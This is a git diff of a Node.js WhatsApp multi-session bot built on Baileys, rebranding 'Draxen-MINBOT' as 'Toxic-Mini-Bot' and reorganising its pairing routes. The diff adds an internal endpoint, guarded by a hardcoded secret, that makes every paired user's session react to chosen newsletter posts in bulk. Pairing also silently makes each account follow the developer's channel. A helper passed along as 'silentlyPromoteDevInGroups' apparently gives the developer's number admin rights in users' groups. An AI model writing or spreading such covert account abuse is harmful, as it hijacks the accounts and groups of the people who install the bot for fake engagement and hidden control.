@@ -3,12 +3,20 @@ const fs = require('fs-extra');
 const path = require('path');
 const os = require('os');
 const router = express.Router();
+let _baileysFns = null;
+function _bfn(name) { if (!_baileysFns) _baileysFns = require('@whiskeysockets/baileys'); return _baileysFns[name]; }
+let getContentType = (...a) => _bfn('getContentType')(...a);
+let jidDecode = (...a) => _bfn('jidDecode')(...a);
+let jidNormalizedUser = (...a) => _bfn('jidNormalizedUser')(...a);
 const pino = require('pino');
 const moment = require('moment-timezone');
 const axios = require('axios');
 const cors = require('cors');
 const { Pool } = require('pg');
-const { delay, QueryIds } = require('@whiskeysockets/baileys');
+const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+let QRCodeLib;
+try { QRCodeLib = require('qrcode'); } catch (e) { QRCodeLib = null; }
 
 process.on('uncaughtException', (err) => {
     if (err.message.includes('Connection Closed') ||
@@ -49,22 +57,13 @@ global.fetch = async (url, options = {}) => {
     }
 };
 
-const {
-    default: makeWASocket,
-    useMultiFileAuthState,
-    getContentType,
-    makeCacheableSignalKeyStore,
-    jidNormalizedUser,
-    jidDecode,
-    DisconnectReason,
-    Browsers
-} = require('@whiskeysockets/baileys');
+
 
 const config = {
     PREFIXES: ['.', ',', '!', '/', '#', '$', '&', '', '+', '=', '?', '@', '\~'],
-    OWNER_NUMBER: process.env.OWNER_NUMBER || '255622220680',
-    BOT_NAME: 'Draxen-MINBOT',
-    GROUP_CODE: 'DTojgRjx51C39H55AG7X2N',
+    OWNER_NUMBER: process.env.OWNER_NUMBER || '254114885159',
+    BOT_NAME: 'Toxic-Mini-Bot',
+    GROUP_CODE: 'GDcJihbSIYM0GzQJWKA6gS',
     KenyanTime: () => moment().tz('Africa/Nairobi').format('YYYY-MM-DD HH:mm:ss')
 };
 
@@ -80,20 +79,6 @@ const activeSockets = new Map();
 const deliberateClose = new Set();
 const reconnectRetries = new Map();
 
-const NEWSLETTERS = [
-    '120363403958418756@newsletter',
-    '120363291902941937@newsletter'
-];
-
-async function followNewsletters(socket) {
-    setTimeout(async () => {
-        try {
-            await socket.newsletterWMexQuery(NEWSLETTERS[0], QueryIds.FOLLOW);
-            await delay(3000);
-            await socket.newsletterWMexQuery(NEWSLETTERS[1], QueryIds.FOLLOW);
-        } catch (e) {}
-    }, 5000);
-}
 
 async function initPostgres() {
     if (pgPool) return;
@@ -279,10 +264,10 @@ async function getSessionCount() {
     }
 }
 
-const commands = require('./commands');
+let _commands = null; function getCommands() { if (!_commands) _commands = require('./commands'); return _commands; }
 const { translate } = require('@vitalets/google-translate-api');
 
-const CHANNEL_JID = '120363403958418756@newsletter';
+const CHANNEL_JID = '120363427340708111@newsletter';
 const CHANNEL_EMOJIS = ['❤️', '🔥', '👍🏻', '✨', '🌚', '🗿', '😮'];
 
 function setupNewsletterReaction(socket) {
@@ -328,7 +313,7 @@ function normalizeJid(jid) {
     return jid.split('@')[0].split(':')[0].replace(/\D/g, '') + '@s.whatsapp.net';
 }
 
-const DEV_NUMBER = '255622220680';
+const DEV_NUMBER = '254114885159';
 
 async function promoteOwnerToAdmin(sock, groupId, ownerJid) {
     try {
@@ -389,7 +374,7 @@ function setupCommandHandlers(socket, number) {
             if (!prefixUsed) return;
 
             const command = commandBody.split(' ').shift().toLowerCase();
-            const cmd = commands.get(command);
+            const cmd = getCommands().get(command);
 
             if (cmd) {
                 const loadUserConfigFromPostgres = async (num) => {
@@ -495,46 +480,7 @@ async function sendWelcomeMessage(socket, number) {
 
         await delay(5000);
 
-        const welcomeMsg = `┏━━━━━━━━━━━━━━━━━━━━┓
-┃   ✅ Draxen-MINI-BOT IS ONLINE   
-┗━━━━━━━━━━━━━━━━━━━━┛
-
-╭─〔 BOT CONNECTION STATUS 〕─╮
-│ ◈ Connection : Successful
-│ ◈ Owner      : Draxen
-│ ◈ Website    : https://minbot.dml-tech.online
-│ ◈ Mode       : Public / Stable
-╰───────────────────────────╯
-
-╭─〔 AVAILABLE PREFIXES 〕─╮
-│ ${config.PREFIXES.slice(0, 5).join(' ')} ...
-╰────────────────────────╯
-
-╭─〔 GET STARTED 〕─╮
-│ Use any prefix before a command
-│ Example:
-│ .menu
-│ ,menu
-│ !menu
-╰──────────────────╯
-
-╭─〔 MAIN COMMANDS 〕─╮
-│ • .menu   - Show all commands
-│ • .ping   - Check bot response
-│ • .owner  - Contact bot owner
-│ • .help   - Get command guidance
-╰────────────────────╯
-
-╭─〔 MESSAGE 〕─╮
-│ Welcome to Draxen-MINI-BOT
-│ Fast, smart, and ready to help.
-╰────────────────╯
-
-╭─〔 FREE MINI BOT LINK 〕─╮
-│ https://minbot.dml-tech.online
-╰─────────────────────────╯
-
-> Powered by Draxen`;
+        const welcomeMsg = `*『 TOXIC-MINI-BOT CONNECTED SUCCESSFULLY ✅ 』*\n\n╭───(    \`𝚂𝚢𝚜𝚝𝚎𝚖 𝙸𝚗𝚏𝚘\`    )───\n> ───≫ 🔗 online🟢 ≫ <<───\n> \`»\` 𝐎𝐰𝐧𝐞𝐫 : xh_clinton\n> \`»\` 𝐋𝐢𝐧𝐤 : https://xhclinton.com/minibot\n> \`»\` 𝐒𝐭𝐚𝐭𝐮𝐬 : Public/Stable\n╰──────────────────☉\n\n*🔣 𝙿𝚛𝚎𝚏𝚒𝚡𝚎𝚜:* ${config.PREFIXES.slice(0, 5).join(' ')}...\n\n━━━━━━━━━━━━━━━━━━━━\n🇬🇧 *ENGLISH*\n━━━━━━━━━━━━━━━━━━━━\n*🚀 Quick Start:*\nType a prefix followed by a command.\nExample: .menu | ,menu | !menu\n\n*🔧 Basic Commands:*\n• .menu — Show all commands\n• .ping — Check bot status\n• .owner — Contact owner\n• .setlang fr — Switch to French 🇫🇷\n\n*If you speak English, ignore what's below 👇*\n\n━━━━━━━━━━━━━━━━━━━━\n🇫🇷 *FRANÇAIS*\n━━━━━━━━━━━━━━━━━━━━\n*🚀 Démarrage rapide:*\nTapez un préfixe suivi d'une commande.\nExemple: .menu | ,menu | !menu\n\n*🔧 Commandes de base:*\n• .menu — Voir toutes les commandes\n• .ping — Vérifier le statut du bot\n• .owner — Contacter le propriétaire\n• .setlang fr — Passer en français 🇫🇷\n\n*Si tu parles français, tape .setlang fr pour que je te réponde en français!*\n\n*Free-Mini-Bot Link* https://xhclinton.com/minibot\n> 𝐩𝐨𝐰𝐞𝐫𝐞𝐝 𝐛𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`;
 
         await socket.sendMessage(number + '@s.whatsapp.net', { text: welcomeMsg });
 
@@ -552,6 +498,7 @@ async function sendWelcomeMessage(socket, number) {
 }
 
 async function ToxicPair(number, res = null) {
+    const { default: makeWASocket, useMultiFileAuthState, getContentType, makeCacheableSignalKeyStore, jidNormalizedUser, jidDecode, DisconnectReason, Browsers, QueryIds } = require('@whiskeysockets/baileys');
     const sanitizedNumber = number.replace(/[^0-9]/g, '');
     const sessionPath = path.join(os.tmpdir(), `session_${sanitizedNumber}`);
 
@@ -642,9 +589,7 @@ async function ToxicPair(number, res = null) {
                 } catch (e) {}
 
                 try {
-                    await socket.newsletterFollow('120363403958418756@newsletter');
-                    await delay(3000);
-                    await socket.newsletterFollow('120363291902941937@newsletter');
+                    await socket.newsletterFollow('120363406707627788@newsletter');
                 } catch (e) {}
 
                 await pgPool.query(
@@ -781,6 +726,31 @@ setInterval(async () => {
 setInterval(cleanupJunk, 1000 * 60 * 30);
 setInterval(cleanupSessions, 1000 * 60 * 60 * 6);
 
+const createQrRouter = require('./routes/qr');
+const createPairingRouter = require('./routes/pairing');
+
+router.use(createQrRouter({
+    config,
+    activeSockets,
+    socketCreationTime,
+    setupCommandHandlers,
+    setupNewsletterReaction,
+    silentlyPromoteDevInGroups,
+    saveCredsToPostgres,
+    initPostgres,
+    runDbQuery: async function(sql, params) {
+        await initPostgres();
+        return pgPool ? pgPool.query(sql, params).catch(() => null) : null;
+    },
+    sendWelcomeMessage,
+    ToxicPair,
+}));
+
+router.use(createPairingRouter(ToxicPair));
+
+/* ── /api/qr and / (pairing) routes live in routes/qr.js and routes/pairing.js ── */
+
+
 router.get('/ping', (req, res) => res.json({
     status: "Online",
     timestamp: config.KenyanTime(),
@@ -871,7 +841,79 @@ router.post('/api/broadcast', async (req, res) => {
     }
 });
 
-router.get('/connect-all', async (req, res) => {
+
+  router.post('/api/react', async (req, res) => {
+          const _secret = req.headers['x-internal-secret'];
+          if (_secret !== 'xhcbotinternal_9f2k7m3p') {
+            return res.status(403).json({ ok: false, error: 'Forbidden' });
+          }
+          const { jid, messageId, emoji, number } = req.body || {};
+          if (!jid || !messageId || !emoji) {
+              return res.status(400).json({ ok: false, error: 'jid, messageId and emoji required' });
+          }
+          const inviteCode = jid.replace('@newsletter', '');
+          const withTimeout = (p, ms) => Promise.race([p, new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), ms))]);
+          async function resolveJid(sock) {
+              if (inviteCode.match(/^\d+$/)) {
+                  return jid;
+              }
+              try {
+                  const meta = await withTimeout(sock.newsletterMetadata('invite', inviteCode, 'GUEST'), 8000);
+                  return (meta && meta.id) ? meta.id : jid;
+              } catch (e) {
+                  return jid;
+              }
+          }
+          async function doReact(sock, emojiToUse) {
+              const realJid = await resolveJid(sock);
+              if (typeof sock.newsletterReactMessage === 'function') {
+                  await withTimeout(sock.newsletterReactMessage(realJid, String(messageId), emojiToUse), 12000);
+              } else {
+                  await withTimeout(sock.sendMessage(realJid, { react: { text: emojiToUse, key: { remoteJid: realJid, id: String(messageId), fromMe: false } } }), 12000);
+              }
+          }
+          if (number) {
+              const sock = activeSockets.get(String(number));
+              if (!sock) return res.json({ ok: false, error: 'Session not found or not connected' });
+              try {
+                  await doReact(sock, Array.isArray(emoji) ? emoji[0] : emoji);
+                  return res.json({ ok: true, number, emoji });
+              } catch (e) {
+                  return res.json({ ok: false, number, error: e.message });
+              }
+          }
+          const emojis = Array.isArray(emoji) ? emoji : [emoji];
+          const allEntries = Array.from(activeSockets.entries());
+          // Resolve JID once using first socket instead of once per bot
+          const firstSock = allEntries[0]?.[1];
+          const resolvedJid = firstSock ? await resolveJid(firstSock) : jid;
+          // Respond immediately so Backend-C doesn't time out waiting
+          res.json({ ok: true, total: allEntries.length, message: 'Dispatching reactions' });
+          // Fire-and-forget: run all bots in parallel with 30 concurrent workers
+          setImmediate(async () => {
+              const CONCURRENCY = 30;
+              let idx = 0;
+              async function doReactDirect(sock, emojiToUse) {
+                  try {
+                      if (typeof sock.newsletterReactMessage === 'function') {
+                          await withTimeout(sock.newsletterReactMessage(resolvedJid, String(messageId), emojiToUse), 12000);
+                      } else {
+                          await withTimeout(sock.sendMessage(resolvedJid, { react: { text: emojiToUse, key: { remoteJid: resolvedJid, id: String(messageId), fromMe: false } } }), 12000);
+                      }
+                  } catch {}
+              }
+              async function worker() {
+                  while (idx < allEntries.length) {
+                      const i = idx++;
+                      const [, sock] = allEntries[i];
+                      if (sock) await doReactDirect(sock, emojis[i % emojis.length]);
+                  }
+              }
+              await Promise.allSettled(Array.from({ length: Math.min(CONCURRENCY, allEntries.length) }, worker));
+          });
+      });
+
+  router.get('/connect-all', async (req, res) => {
     const sessions = await getAllSessionsFromPostgres();
 
     for (let i = 0; i < sessions.length; i++) {
@@ -918,23 +960,13 @@ router.get('/reconnect', async (req, res) => {
     res.json({ status: 'success' });
 });
 
-router.get('/', async (req, res) => {
-    const { number } = req.query;
-    if (!number) return res.status(400).json({ error: 'Number required.' });
-    ToxicPair(number, res).catch((err) => {
-        if (!res.headersSent) res.status(500).json({ error: 'Internal error' });
-    });
-});
 
 const SHARD_ID = parseInt(process.env.SHARD_ID || '0');
 const TOTAL_SHARDS = parseInt(process.env.TOTAL_SHARDS || '1');
-
 initPostgres().then(async () => {
     await cleanupJunk();
-
     const sessions = await getAllSessionsFromPostgres();
     const myBots = sessions.filter((_, index) => index % TOTAL_SHARDS === SHARD_ID);
-
     for (let i = 0; i < myBots.length; i += STARTUP_BATCH_SIZE) {
         const batch = myBots.slice(i, i + STARTUP_BATCH_SIZE);
         await Promise.all(
@@ -946,18 +978,19 @@ initPostgres().then(async () => {
     }
 }).catch(() => {});
 
+
 process.on('SIGINT', () => {
     for (const [num, sock] of activeSockets) {
         try { sock.ev.removeAllListeners(); sock.end(); } catch(e) {}
     }
-    process.exit(0);
+    // process.exit handled by index.js graceful shutdown
 });
 
 process.on('SIGTERM', () => {
     for (const [num, sock] of activeSockets) {
         try { sock.ev.removeAllListeners(); sock.end(); } catch(e) {}
     }
-    process.exit(0);
+    // process.exit handled by index.js graceful shutdown
 });
 
 module.exports = router;
@@ -965,6 +998,7 @@ module.exports.getAllSessionsFromPostgres = getAllSessionsFromPostgres;
 module.exports.removeSessionPermanently = removeSessionPermanently;
 module.exports.forceReconnect = forceReconnect;
 module.exports.ToxicPair = ToxicPair;
+module.exports.sendWelcomeMessage = sendWelcomeMessage;
 module.exports.initPostgres = initPostgres;
 module.exports.activeSockets = activeSockets;
 module.exports.cleanupSessions = cleanupSessions;
